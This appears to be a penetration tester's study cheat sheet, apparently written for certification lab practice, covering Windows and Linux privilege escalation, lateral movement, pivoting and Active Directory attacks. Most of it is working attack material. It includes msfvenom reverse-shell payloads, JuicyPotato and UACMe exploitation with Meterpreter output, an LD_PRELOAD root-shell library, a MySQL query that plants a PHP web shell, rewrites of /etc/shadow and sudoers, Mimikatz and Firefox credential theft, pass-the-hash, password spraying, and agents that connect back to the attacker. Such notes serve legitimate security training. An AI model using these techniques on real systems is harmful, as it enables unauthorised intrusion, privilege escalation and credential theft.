runas.exe /savecred /user:Administrator cmd.exe # -> cmd.exe (Can be a command or a payload)
```

- Vectors:
    1. Insecure Service Configuration
    2. Unquoted Service Paths
    3. Weak Registry Permissions
    4. Vulnerable Scheduled Tasks 
    5. Insecure File Permissions
    6. Insecure DLL Search Orders
    7. Stored Creds

### Scripts (Migrate to more stable process before script execution, to access **memory info**, for more verbosity. TO NOT LOSE EASY PRIVESC CHANCES!!)

- Stable Process Example → **svchost.exe OR explorer.exe**
- PowerUp - Part of PowerSploit. Set of PowerShell-Based Tools designed for Post-Exploitation and Exploitation Activities. PowerUp for identifying Privilege Escalation vectors.
    
    ```powershell
    powershell -ep bypass
    . .\PowerUp.ps1 # OR Import-Module .\PowerUp.ps1 
    # CMDLets:
    Invoke-AllChecks
    Invoke-PrivescAudit
    Get-UnquotedService # -> To get Unquoted Paths
    Get-ModifiableService # -> To get services can modify
    ```
    
- PrivEscCheck (Look for **KO** in the report)
    
    ```powershell
    powershell -ep bypass
    . .\PrivescCheck.ps1
    Invoke-PrivescCheck # Default
    Invoke-AuditInstalledPrograms # Outdated & vulnruble softwares
    Invoke-ServiceAudit # Windows services PrivEscCheck
    ```
    
- [**linux-exploit-suggester**](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [**LinEnum**](https://github.com/rebootuser/LinEnum)
- Metasploit Exploit Suggester
- AccessChk

## Windows Privilege Escalation

### Locally Stored Creds

- Unattended Installation file
    - Can be detected using PowerUp.ps1
    
    ```powershell
    # Configuration, and Stored passwords (May one of the passwords is elevated privs)
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Autounattend.xml
    ```
    
- Credential Management (Sometimes PowerUp.ps1 Do NOT DETECT IT!(SO TEST EVERYTHING))
    
    ```powershell
    powershell
    cmdkey /list
    runas.exe /savecred /user:Administrator <command>
    ```
    
- PowerShell History (INFO: It must be deleted with every session)
    
    `(Get-PSReadLineOption).HistorySavePath`
    
    - Usually happens when administrative use unprivileged user account
    
    ```powershell
    type "%appdata%\\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    # OR 
    Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    ```
    

### Service Exploits

- https://github.com/tonyarris/srv ⇒ Get-ServiceAcl.ps1
- Critical System Services run with High Privileges (LocalSystem, LocalService, or NetworkService)
- Exploiting Insecure Service Permission
    1. Identifying with scripts (PowerUp, AccessChk, PrivescCheck, or Metasploit)
    2. Analyze Service Permission 
    3. Modify the Service Configuration
        1. Like changing the path OR Replacing the service with a malicious one
    4. Restarting the service (Maybe with restarting the machine sometimes)

```powershell
# Make sure of the archtiecture of the target 
[Environment]::Is64bitProcess
# Confirmation that you can write 
Get=Service -Name "ServiceName"
icacls "Service Path\Service.exe"
Get-Acl "Service Path" | Format-List # <- Better
# Restarting the service
net stop "ServiceName"
net start "ServiceName"

# For Fast Migration for stable shell connection(It might be useless):
msf6 exploit(multi/handler)>set InitialAutoRunScript post/windows/manage/migrate
```

### Registry AutoRun

```powershell
 ***# Common Autorun scenarios/Events:***
    #1. System Startup: With system boot up
         "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Get-Acl "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | fl
    #2. User Login: When a user log in
         "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Get-Acl "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | fl
    #3. Secure initiation: Services that start with the system
         "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services"
         Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services" | fl
    #Note:
	    "It can also be identifed with tools like '**PowerUp.ps1**'"
	    
***# Identication:***
		#1. Check AutoRun Registries:
			reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
		#2. What privs we have on the regestries?
			Get-Acl "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | fl
		#3. What Privs we have in the Service/Executable?
			Get-Acl "C:\Program Files\HTTPServer\hfs.exe" | Format-List
			
***# Exploitation:***
		#1. By Reg Data/path modification into malicious .exe or service
		#2. By Adding a new reg points to malicious .exe or service
		#NOTE:
			"For Test purposes, to sign out from the administrator machine.."
				shutdown /l
```

### Impersonation Attacks

- Imperonate Attack (Direct)
    
    ```powershell
    ***# Meterpreter - Incognito***
    meterpreter > load incognito
    meterpreter > list_tokens -u 
    meterpreter > impersonate_token "token"
    ```
    
- Create an access token then impersonate (JuicyPotato.exe)
    1. DCOM (Distributed Component Object Model) and CLSIDs (Class Identifiers)
        1. DCOM use CLSIDs to manage communication, with each request to DCOM it create new process run under specific security context
    2. Manipulating LocalService Tokens
        1. Potato exploit a vuln in how DCOM processes and services interact particularly when creating tokens by leveraging LocalService token
    3. Creating a Malicious COM Server
        1. Exploit done by creating a fake COM server and register it with specific CLSID. Allowing the attacker to direct requests to their malicious COM server to **manipulate** the token used for that process.
    4. Impersonation and Token Duplication
        1. Once fake COM is registered and initiated, Potato create LocalService token and then **manipulate** it into high-privs context like SYSTEM **(Duplicating and Adjusting)**
    
    ```powershell
    # Make sure of the archticture:
    PS C:\Windows\system32> [Environment]::Is64BitProcess
    # Generate the payload: 
    msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=10.10.45.2 LPORT=5555 -f exe -o test.exe
    # Upload the payload 
    meterpreter > upload test.exe
    # Upload JuicyPotato.exe
    meterpreter > upload /root/Desktop/tools/JuicyPotato/JuicyPotato.exe
    # Exploit... -l <PayloadPort(LPORT)> -c <CLSID>
    C:\temp>JuicyPotato.exe -l 5555 -p C:\temp\test.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
    ......
    [+] authresult 0
    {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
    [*] Sending stage (201798 bytes) to 10.6.29.96
    [+] CreateProcessWithTokenW OK
    # Multi/Handler
    [*] Meterpreter session 7 opened (10.10.45.2:5555 -> 10.6.29.96:50033) at 2025-08-17 11:25:03 +0530
    ```
    

### Other Advanced Techniques

- UAC Bypass with UACMe
    
    ```powershell
    # 1- Make sure you are in administrators Group
    C:\Windows\system32>whoami
    victim\admin
    C:\Windows\system32>net localgroup administrators
    Alias name     administrators
    Comment        Administrators have complete and unrestricted access to the computer/domain
    Members
    -------------------------------------------------------------------------------
    admin
    Administrator
    # 2- Identify Archtiecture
    	# Powershell
    	[Environment]::Is64BitProcess
    	# Meterpreter
    	meterpreter> sysinfo
    # 3- Create a payload to execute as administrator
    	msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=10.10.45.13 LPORT=5555 -f exe -o test.exe
    # 4- Upload shell.exe and UACMe exploit.exe (Akagi.exe)
    meterpreter > upload /root/test.exe
    meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
    # 5- Usage of Akagi64.exe
    C:\Temp>Akagi64.exe <key(e.g.23)(Found in GitHub)> C:\Temp\test.exe
    # 6- (In the New Session) Get stable:
    meterpreter> migrate -N lsass.exe
    ```
    
- DLL Hijacking
    
    ```powershell
    ***DLL Hijacking:***
    # This technnique need RDP to use **Procmon64.exe**
    
    # 1- Open Procmon64.exe
    # 2- Analyze instance under Operation Called (CreateFile)
    	## Remove NetworksActivity and RegeistiesActivity and filter only CreateFile
    # 3- Launch targetApplication.exe	
    # 4- Filter only for the process Name (targetApp.exe)
    # 5- Find "Name not found" instances
    # 6- Where "Name Not Found" instance, find one that you as init access can write in it to inject you Malcious DLL there
    Get-ACL 'Path' | Format-List
    	<Domain>\<user> Allow  FullControl
    # 7- IMPORTANT: Payload is better to be 32-bit (Normal)
    ```
    

## Linux Privilege Escalation

- Locally Stored Creds
    - Search in places like `/var/www/html/local/config/database`
    - Specially like `/var/www/html/`
    - Use grep -nr ⇒ grep -nr “db_user, db_pass, **root**, username, admin ,or password”
- Misconfigured File Permissions
    
    ```bash
    # Files we can **modify** and **read**
    find / -not -type l -perm -o+w
    /etc/shadow
    ## /etc/shadow misconfiguration abuse for Privilege Escalation
    openssl passwd -1 -salt abc password1
    <output>
    # Modify /etc/shadow
    root:<output>:*:*.. # Root password has been changed!
    ```
    
- Exploiting SUID Binaries
    - Exploiting SUID binaries Factors
        1. Owner of the SUID binaries - Must owned by “**root**”
        2. Access Permissions - We need “**execute**” permission to execute SUID binary
    - Sometimes you need go beyond GTFOBins & AI in researching!
    
    ```bash
    find / -perm -4000 -type f 2>/dev/null
    `find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set
    `find / -type f -perm -04000 -ls 2>/dev/null`
    ```
    
- If you can write and read or aa sort of access to /etc/sudoers via SUID or cronjobs..etc.
    - Add this ⇒ `<YourUser> ALL=(ALL) NOPASSWD:ALL` OR `<YourUser> ALL=NOPASSWD:ALL` in /etc/sudoers
    - Then execute ⇒ `sudo /bin/bash`
- Misconfigured Sudo Privileges
    - `sudo -l`
- sudo version
    - `sudo --verison`
- Linux Kernel version
- pspy enumeration
    
    [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
    
- Shared Library Injection
    - **Shared Library Injection:** Injecting a custom shared library into a running process to execute arbitrary code or manipulate the process’s behavior
        - **Steps:**
            1. Identify a Target process running with elevated privileges & Identify if you can run LD_PRELOAD as sudo or SUID 
                
                `sudo -l` or `find / -type f -perm -04000 -ls 2>/dev/null`
                
            2. Create a Malicious Shared Library have malicious commands or script and it will run as root
                
                ```bash
                vim name.c 
                
                #include <stdio.h>
                #include <sys/types.h>
                #include <stdlib.h>
                void _init() {
                unsetenv("LD_PRELOAD");
                setgid(0);
                setuid(0);
                system("/bin/sh");
                }
                
                # Compile
                gcc -fPIC -shared -o name[.so](http://shell.so) name.c -nostartfiles
                ```
                
            3. Inject the Shared Library into the target process
                1. Injection Techniques:
                    1. LD_PRELOAD ⇒ Preload malicious shared library into a process
                        
                        `sudo LD_PRELOAD=/pathTo/shell.c <serviceName>`
                        
                    2. ptrace ⇒ Inject code into a running process, causing it to load a malicious shared library

# Lateral Mov & Pivoting

- Specify brute force
    - **Linux ⇒ root**
    - **Windows ⇒ administrator**
- Identification:
    - ***Lateral Movement:***
        - Moving from one system to other within network.
        - Moving between systems in the same network, targeting adjacent or nearby systems
        - **Primary goal** is to escalate access and privileges within the network
        - Techniques:
            - Credentials or Hashes (SSH,WMI or RDP.. etc.)
            - Exploit misconfiguration
            - exploit vulnerabilities
            - Shared resources
            - Credentials-Based Attacks
        - ***Windows Lateral Movement:***
            1. **Credential-Based** ⇒ (PtH, PtT, Creds reuse, or golden/silver ticket)
            2. **Authenticated Remote Code Execution (Protocols/Framework/Techniques)**
                - **NOTE: START WITH SPRAYING `administrator` FIRST**
                - winrm - Windows Remote Management Protocol - 5985 & 5986:
                    - Tools: evil-winrm, crackmapexec
                - RDP - Remote Desktop Protocol - 3389
                    - ***How Attack works?***
                        - Allow RDP and add a user to RDP group to interact with GUI
                    - Tools: xfreerdp, rdesktop, Metasploit
                - WMI - Windows Management Instrumentation (Not a Protocol its a framework)
                    - Used for command execution and move laterally
                    - Tools: wmiexec
                - SMB - Server Message Block - 445, 139
                    - ***How Attack works?***
                    - Tools: SMBExec, Psexec, crackmapexec ..etc
                - PowerShell Remoting
                    - ***How Attack works?***
                        - Exfiltrate data,  execute scripts, install backdoors
                    - Tools: PowerShell(Invoke0Command, Enter-PSSession), Metasploit modules, Empire framework, Powercat
    - ***Pivoting:***
        - Use compromised system as a pivot point to access other system or network segments that inaccessible from the attacker machine (e.g. DMZ)
        - Using the compromised system to access other more restricted network segment
        - **Primary goal** is to bypass network boundaries or accessing different network segments
        - Techniques:
            - Port forwarding
            - Configure network routes
            - SSH tunneling
            - proxyservers
            - exploiting VPN
            - Complex network routing technique

---

## Windows Lateral Movement

- ***NTLM Challenge Mechanism Process***
    1. **Connection Request:** Connection initiating (e.g. request a service or connection)
    2. **Server Challenge:** Server responds with NTLM challenge which is a random value used to ensure that the authentication process is unique for each session
    3. **Client Response:** Calculates the challenge to encrypt it with the NTLM hash of the client’s password (NTLMv1 (DES → Old) or NTLMv2 (Save from relay attack, its a combination of the challenge and the user’s NTLM))
    4. **Server Verification:** Compare it with the expected response 

### PsExec

- `hydra -l administrator -P <.txt> <ip> **smb2`** ≠ `hydra -l administrator -P <.txt> <ip> **smb1**`
    - and you can detect that with —script=smb-protocols
    - scanner/smb/smb_login ⇒ Detect it automatically+
    - psexec need special privileges to work or must be administrator to work (due to service creating, it need permissions)
        
        `impacket-psexec DOMAIN/<User>:<Password>@<ipORdomainName>`
        
        `impacket-psexec DOMAIN/<User>:<Password>@<ipORdomainName> -share <Share>`
        
    - As a post-exploitation step, you can add a user/Or Create a user and add to administrators or Print Operators group to initiate connection with PsExec. **To use PsExec you need “Administrative privileges on the target system.”**

### SMBExec

- ***Why SMBExec is Better than PsExec?***
    1. **Does not Create a Temporary Service:** It use WMI (Windows Management Instrumentation).. use cleaner techniques and less noisy 
- but, it’s **command execution so its semi-interactive** shell and executes **each command separately**
- It also need administrivia privileges
    
    `impacket-smbexec DOMAIN/<User>:<Password>@<ipORdomainName>`
    
    `impacket-smbexec DOMAIN/<User>:<Password>@<ipORdomainName> -share <Share>`
    

### CrackMapExec (CME)

<protocol> ⇒ **{smb,mssql,winrm,ftp,ldap,ssh,rdp}**

*Specialized for Windows

- Protocol-Specific Help-Menu
    
    `crackmapexec <protcol> --help`
    
- Protocol-Specific Modulles-Menu
- `crackmapexec <protcol> -L`
- Use cases:
    1. Network Enumeration and Reconnaissance 
        
        `crackmapexec smb -u '' -p '' demo.ine.local --shares, loggedon-users,sessions, local-admin, pass-pol`
        
        +
        
        `Modules`  ⇒ `-L`
        
    2. Creds Testing and Brute Forcing
        
        `crackmapexec smb demo.ine.local -u <.txt or a user> -p <.txt or a user> --continue-on-success 2>/dev/null | grep '[+]'`
        
    3. Lateral Movement 
        
        `crackmapexec smb demo.ine.local -u 'administrator' -H 'ntlmHash’`
        
        `crackmapexec smb demo.ine.local -u 'administrator' -p 'password’`
        
        `crackmapexec smb demo.ine.local -u 'administrator' -H 'ntlmHash’ -M web_delivery -o URL=<URLFromMetasploit>`
        
    4. Privilege Escalation
        1. `crackmapexec <protcol> -L` Through post-exploitation modules
        2. `crackmapexec smb demo.ine.local -u "user" -H "NTLMHash" -M "rdp" -o ACTION=enable`
    5. Remote Command Execution (WMI, SMB ..etc.)
        1. cmd
            
            `crackmapexec smb demo.ine.local -u 'administrator' -p 'sebastian’ -x ‘whoami’`
            
        2. PowerShell
            
            `crackmapexec smb demo.ine.local -u "administrator" -p "sebastian" -X "[Environment]::Is64BitProcess”` 
            
    6. Brute Forcing an entire subnet

### RDP

- RDP is a treasure in Lateral Movement!
- Persistence or RDP access technique
    
    ```bash
    net user guest1 StrongP@ssw0rd /add 
    net localgroup "Remote Desktop Users" guest1 /add
    xfreerdp /u:guest1 /p:StrongP@ssw0rd /v:demo.ine.local
    ```
    
- ***DPAPI decryption*** (RCMan-RDP) using ``SharpDPAPI.exe`` Tool
    
    ```bash
        1. Identify `.rdg` or any DPAPI encrypted credentials files and its GUID
            `SharpDPAPI.exe rdg /unprotected`
            
        2. Identify the masterkey using `mimikatz`
            `privilege::debug`
            `sekurlsa::dpapi`
            
        3. Decryption 
            `SharpDPAPI.exe rdg <GUID>:<MasterKey(SHA1)>`
    ```
    

### WinRM

- Required Privileges to use WinRM
    - Any user in **Administrators** or **Remote Management Group** group can access winrm
    - They will execute with their privileges not admin privileges
    - Tools:
        - Evil-winrm
            - Can transfer files and gather info
            - Support PtH
            - Can load PowerShell modules
                
                `evil-winrm -u '<user>' -p '<pass>' -i <ipORDomainName> -s '<scriptPath/>'`
                
                `evil-Winrm> Invoke-<ScriptName>.ps1` to add it to the **`menu`**
                
                **e.g.** `Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonPasswords"`
                
        - Crackmapexec
            - Great for Brute-Forcing
                
                ```bash
                crackmapexec winrm <ipORDomainName> -u '<.txtOrUser>' -p '<.txtOrPass>' 
                
                ```
                
        - PSRemoting
            - Enabling
                
                ```bash
                # Target Machine
                PS C:\Users\Administrator> Enable-PSRemoting
                ```
                
            - Connecting
                
                ```bash
                pwsh
                $cred = Get-Credential
                Enter-PSSession -ComputerName 10.6.30.232 -Authentication Negotiate -Credential $cred
                
                ```
                
            - PowerShell Feature, allow you to run powershell commands or scripts
            - Built-on WinRM
            - use more for Administrative PowerShell based tasks
            - Less noisy
            - Needs to enabled explicitly even if WinRm is enabled

## Pass-The-Hash Attack

- If you have only the NT hash .. you can fill the LM part with zero’s to be accepted in tools like Metasploit .. Number of numbers in LM must match in NT
- Change the payload architecture if something went odd

### WMIExec

- ***WMI***:  Used for managing, monitoring, gather system information, execute scripts, and controlling system operations, all though consistent interface. Use **RPC (135) Dynamic RPC Ports (49152-65535)** and DCOM
- wmiexec.py:
    - Best Technique to Lateral movement using RCE via WMI.
    - It send WMI request to execute a command then retrieve the output without leaving much significance traces
    - `impacket-wmiexec <User>[@](mailto:administrator@10.6.18.161)<OnlyIP> -hashes '<LM:NT>'` you can add `-shell-type {cmd,powershell}`

## Linux Lateral Movement

1. multi/mysql/mysql_udf_payload ⇒ This module help you to get a shell using mysql creds
    1. set FORCE_UDF_UPLOAD true
    2. don't set session
2. mysql php-shell using cmd if we have file upload vuln:
    1. `MySQL []> SELECT '<?php echo system($_GET["cmd"]); ?>' into DUMPFILE '/var/www/html/webtemp/backdoor.php'`
    2. `proxychains curl http://192.98.164.3/webtemp/backdoor.php?cmd=whoami`
3. Adding a route for using metasploit m
4. Analyze step by step so you don't get lost within the topology
5. Analyzing `~/.bash_history` ⇒ SO IMPORTANT
6. Analyzing `~/.ssh/authorized_keys` OR looking for `id_rsa`
7. MOST IMPORTANT: Analyzing `/home/<Anyuser>` Hidden files e.g. ".mozilla" & .ssh.. etc.
8. Use Metasploit `su_login` module
9. Look for databases and analyze it locally “`.db`” or “`.sqlite`”. You will need (DB usually have everything)
10. Cracking Firefox browser login creds:
11. Analyze `env` (Environment Variables)
12. Analyzing `/etc/passwd` To know your targets
13. Analyze History, logs, and mails
14. Analyze `ps aux` . Looking for sus processes especially the ones working with root or other user not you
15. Sometimes you need local port forwarding to access **specific service** you cant access (***VIA SSH TUNELING*** NOT PORT FORWARDING)
    
    ```bash
    ssh -4 -L <localPort>:127.0.0.1:<Port> <user>@<IP>
    ```
    
16. Find locally stored credentials
    1. Obtain `logins.json` & `key4.db` in `.mozilla/firefox/sj1c9rus.default` or using msfconsole `gather/firefox_creds`
    2. python3 **firepwd.py** ~/<Where `logins.json` & `key4.db` is stored>/

---

## Pivoting

- Subnets enumeration:
    - **Network Interfaces**
        - `ipconfig /all` / `ip a` / `Get-NetIPConfiguration`
    - **Routing Tables**
        - `route print` / `ip route` / `Get-NetRoute`
    - **ARP / Neighbor Discovery**
        - `arp -a` / `ip neigh`
    - **Active Connections**
        - `netstat -ano` / `ss -tuna`
    - **DNS Enumeration**
        - `ipconfig /displaydns` / `nslookup`
    - **Passive Traffic Monitoring**
        - `netsh trace start capture=yes` / `tcpdump -i any`
    - **Reverse / Blind Scanning**
        - `ping` / `nmap` / `fping` / `arp-scan`
    - **Installed Software / Processes**
        - Check for VPNs or tunneling software
    - **Configuration Files**
        - `/etc/hosts` / VPN configs / `C:\Windows\System32\drivers\etc\hosts`
    - **Proxy / Tunnel Tools**
        - Meterpreter route add / SSH port forwarding / Chisel / SSHuttle / Ligolo-ng
    - **Multi-Homed Hosts**
        - Identify hosts with multiple interfaces bridging networks
- ***Other machine can’t be accesses, because:***
    - Its internally and cant be accessed
    - its not internally, but it’s only accessible with the first machine
- Bind ⇒ We connect To
- Reverse ⇒ He connect Back
- subnets:
    - **255.255.0.0 → /16**
    - **255.255.240.0 → /20**
    - **255.255.255.0 → /24**
1. Proxychains X Socks 
    1. This technique **cant do Host Discovery**
    2. ITS IMPORTANT TO NOT PING HERE! “-Pn”
    
    ```bash
    cat /etc/proxychains4.conf 
    socks4  127.0.0.1 9050
    
    msf6 auxiliary(server/socks_proxy) > set srvport 9050
    ##
    
    meterpreter > run autoroute -s <Target1IP>.0/24
    
    proxychains nmap **-sT -Pn** -T4 # -p<port's> OR -F
    proxychains nmap **-sT -p<port> -Pn** -T4
    ```
    
2. autoroute-meterpreter (Port-Forwarding)
    
    ```bash
    meterpreter > run autoroute -s <Target1IP>.0/24 
     # Take the <targetIP-OR-Route> from ifconfig in meterpreter (More Stable)
     
    # Then use modules like portstcan and do portfwd
    # To delete a route
    meterpreter > run autoroute -d -s <route> -n <subnet>
    
    ```
    
3. reGeorg 
    1. This is so special because it help to Pivoting **without the need of Administrivia privileges**
    2. Mostly used with file upload because it needs URL access (Mostly) 
    
    ```bash
    #####
    upload /root/Desktop/tools/reGeorg/tunnel.php =>
    			 # to accessible place via http e.g.(themes)
    ###
    python reGeorgSocksProxy.py -p 9050 -u http://ip/*/tunnel.php                                                                                                                   
    # 9050 => proxychains port
    ###
    netstat -antp | grep 9050
    # Make sure all good
    ##
    proxychains nmap -sT -Pn <ip>
    ###
    proxychains hydra..* 
    ```
    
4. SSH Tunneling (SSH Port Forwarding) ***Dynamic Port Forwarding***
    - General Pivoting Techniques:
        - ***Local Port Forwarding*** (I Connect To):
            - Redirecting traffic from a local port on the client system to a specified port on the remote system. Allowing to create secure tunnels to internal resources.
                
                ```bash
                ssh -4 -L <localPort>:127.0.0.1:<Port> <user>@<IP>
                ```
                
        - ***Remote Port Forwarding*** (Connect Back):
            - Allowing traffic on the remote system to be forwarded to a specified port on local system (Great for persistence)
        - ***Dynamic Port Forwarding* *(Back and Forth)* (SSH Tunneling)**:
            - Created a socks proxy using SSH, allowing flexible port forwarding based on client request. More flexible tunneling
            - Can used to access multiple internal resources or service thorough a single SSH connection
            
            ```bash
            # Traffic directing to Proxychains using Dynamic forwarding SSH Tunneling
            # SSH will make the socks proxy for us dynimaclly forwarded via SSH
            ## it is better than other techniques
            
            # From Attacker machine
            ssh <user>@<Target1ip> -D <SRVPORT(e.g.9050)>
            
            # From Attacker machine (New Tab)
            proxychains nmap -sT -Pn ..etc
            
            ```
            
5. ligolo-ng
    
    CHOOSE ONE LISTENER ONLY FOR THE SAME SUBNET
    
    GO WITH THE WIDER ACCESS !
    
    [https://github.com/nicocha30/ligolo-ng/releases](https://github.com/nicocha30/ligolo-ng/releases)
    
    1. Setup
        
        ```bash
        # Attacker
        ## Setting up ligolo interface
        sudo ip tuntab add user <user> mode tun ligolo
        # OR
        sudo ip tuntap add dev ligolo mode tun user root
        ### Put it in up status
        sudo ip link set ligolo up  
        ```
        
    2. Connecting agent to proxy
        
        ```bash
        # Attacker
        ## Proxy starting
        ligolo-proxy -selfcert
        #OR
        ligolo-proxy -laddr 0.0.0.0:11601 -selfcert 
        # Selfcert only in trusted envirnonment 
        
        # Target (Agent Connecting)
        ligolo-agent -connect <Attacker.ip>:11601 -ignore-cert
        
        ```
        
    3. Session establishing
        
        ```bash
        ligolo-ng >> session
        # select the wanted session
        # Find out interfacing
        [Agent : <targetName>] >> ifconfig
        ```
        
    4. Actual pivoting
        
        ```bash
        sudo ip route add <subnet>0/24,20,16..etc dev ligolo
        
        # Back in ligolo
        [Agent : <targetName>] >> start
        ```
        
    - For a double pivot..triple..etc
        
        ```bash
        ## Setting up a double-pivot ligolo interface
        sudo ip tuntab add user <user> mode tun ligolo-double
        sudo ip tuntap add dev ligolo-double mode tun user root
        
        ### Put it in up status
        sudo ip link set ligolo up  
        ```
        
        1. Listener adding
            
            ```bash
            lstener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
            ```
            
        2. Second/Target2 agent connecting 
            
            ```bash
            ligolo-agent -connect <Target1.IPWNewSubnet!>:11601 -ignore-cert
            ```
            
        3. Session establishing and start pivoting
            
            ```bash
            ligolo-ng >> session
            [Agent : <target2-Name>] >> ifconfig
            [Agent : <target2-Name>] >> tunnel_start --tun ligolo-double
            sudo ip route add <subnet>0/24,20,16..etc dev ligolo-double
            
            ```
            
    - Flushing ligolo after using
        
        ```bash
        pkill -f ligolo
        ip link show
        sudo ip link delete ligolo
        
        ```
        
6. chisel
    1. Working on it
7. Empire
    1. Working on it

# AD PT

- There are great AD PT info, tips, commands, tools syntax, techniques, phases, and many more in **PT1-THM study notes**

## Methodology of AD PT

- Methodology
    
    [https://orange-cyberdefense.github.io/ocd-mindmaps/](https://orange-cyberdefense.github.io/ocd-mindmaps/)
    
    1. Initial Compromise
        1. Password Spraying (Known Users)
        2. Brute-Force Attacks
        3. Phishing
        4. Poisoning (LLMNR/NBT-NS Poisoning\SMB Relaying)
    2. Host Reconnaissance
    3. Domain Enumeration
        1. PowerView
        2. BloodHound
        3. LDAP Enumeration
    4. Local Privilege Escalation
        1. Kerberoasting (Obaining encrypted service account passwords (SPN)⇒ Then crack it to get the plain password)
        2. AS-REP Roasting (Do Not Require Kerberos preauthentication)
    5. Administrator Enumeration
    6. Lateral Movement
        1. PtH
        2. PtT
    7. Domain Admin Privs
    8. Cross Trust Attacks
    9. Domain Persistence 
        1. Silver Ticket (Forging any Kerberos Ticket)
        2. Golden Ticket (Forging Kerberos tickets for arbitrary users)
    10. Exfiltrate 

## PowerShell x AD

```powershell
Get-ADUser -Filter *
Get-ADGroup -Filter *
Get-ADPrganizationalUnit -Filter *
gpupdate /force
Get-ADUser $env:username -Properties MemberOf

```

### PowerView-ADEnumeration

```powershell
powershell -ep bypass
. .\PowerView.ps1
#Domains#
# Get current domain
Get-Domain
# Get parent domain
Get-Domain -Domain SECURITY.local
# Get domain SID => Important For Forging Tickets (Golder/Silver)
Get-DomainSID
# Domain Policy & SYSVOL Path
Get-DomainPolicy
# Specific Policy check
(Get-DomainPlicy)."SystemAccess"
(Get-DomainPlicy)."KerberosPolicy"
# Domain Controller
Get-DomainController
Get-DomainController -Domain SECURITY.local
#Users#
# List all user accounts in the current domain
Get-DomainUser
Get-DomainUser | select samaccountname, objectsid
# Speicifc domain user info
Get-DomainUser -Identity <User>
#Spicific properties
Get-DomainUser -Identity <User> -Properties DisplayName, MemberOf, Objectsid, useraccountcontrol | fl
# Identify machines where a specific user has local admin rights
Find-LocalAdminAccess
#Computers#
Get-NetComputer
Get-NetComputer | select Name
Get-NetComputer | select Name, cn, operatingsystem
# Get computers in specific domain
Get-NetComputer -Domain SECURITY.local | select Name, cn, operatingsystem
# Find the computers that you are an admin in it
Find-LocalAdminAccess
#Groups#
Get-NetGroup
Get-NetGroup | select name
# Particular group info
Get-NetGroup 'Domain Admins'
# Members of a group
Get-NetGroupMember 'Domain Admins' | select MemberName
# What groups this user in
Get-NetGroup -userName "ELISE_GUZMAN" | select Name
#Domain Shares#
Find-DomainShare -ComputerName prod.research.SECURITY.local -verbose
Get-NetShare
# What shares we have read access we have to
Find-DomainShare -ComputerName prod.research.SECURITY.local -CheckShareAccess -verbose
#GPOs#
Get-NetGPO | select displayname
#OUs#
Get-NetOU
Get-NetOU | select name, distinguishedname
#Domain, Trusts#
# Trusts
Get-NetDomainTrust
# Forest 
Get-NetForest
# Forest Trust mapping
Get-NetForestTrust
Get-NetForestTrust -Forest tech.local
Get-NetForest -Forest tech.local
# Forrest domain mapping
Get-NetForestDomain
Get-NetForrestDomain -Forest tech.local
Get-Domaintrustmappping
#ACLs#
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | select IdentityRefrenceName, ObjectDN, ActiveDirectoryRights
#Privilege Escalation#
# Kerberostable Accounts
Get-NetUser -sPN | select samaccountname, serviceprinucipalname
# AS-REP Roasing Accounts
Get-NetUser -PreauthNotRequired | select samaccountname, distinguishedname, useraccountcontrol
```

## AD Enumeration

### Password Spraying

```powershell
# 1- Get the users list
PS C:\Tools> powershell -ep bypass
PS C:\Tools> . .\PowerView.ps1
PS C:\Tools> Get-DomainUser | Select-Object Name
# OR
PS C:\Tools> Get-DomainUser | Select-Object Name -ExpandProperty cn | Out-File user.txt
# OR
PS C:\Tools> net user /domain
####
# 2- Initiate the attack
PS C:\Tools> powershell -ep bypass
PS C:\Tools\Scripts\credentials> . .\DomainPasswordSpray.ps1
PS C:\Tools\Scripts\credentials> Get-Help Invoke-DomainPasswordSpray -Examples
PS C:\*> Invoke-DomainPasswordSpray -UserList C:\*\users.txt -Password 123456 -OutFile C:\*\results.txt
PS C:\*> Invoke-DomainPasswordSpray -UserList C:\*\users.txt -PasswordList pass.txt -OutFile C:\*\results.txt
# 3- Abuse
PS C:\Users\student> runas.exe /user:<user>@<domain>.local cmd.exe
```

### BloodHound

- Use Owned marking , it helps
    - You can get the shortest path to specific user
    - You can get shortest path from owned principals

## AD Privilege Escalation

- Our targets are:
    - **Domain Admins**
    - **Kerberosatable**
    - **AS-REP**
    - **Delegation**
    - DCSync permission
    - And others**..**

### AS-REP Roasting (NPU)

- Misconfiguration exploitation in Kerberos Authentication
- When a user wants to authenticate to a service they send an AS-REQ to KDC. The KDC responds with an AS-REP which includes a TGT, and the TGT is encrypted using the user’s password hash.
- AS-REP Roasting takes advantage of the fact that some user accounts in AD may have “Do Not Require Kerberos preauthentication” option enabled
    - Which allows the AS-REP to be requested without the need for the user’s password
    - **NOTE: AS-REP Hash Can Be Used For Pass-the-Hash Attack**
- Exploit Process:
    
    ```powershell
    # 1- Identify user with "DO NOT PRE PRE AUTH" enabled
    powershell -ep bypass
    . .\PowerView.ps1
    Get-NetUser -PreauthNotRequired | select samaccountname, distinguishedname, useraccountcontrol johnny
    # OR
    Get-DomainUser | Where-Object { $_.UserAccountControl -Like "*DONT_REQ_PREAUTH*" }
    
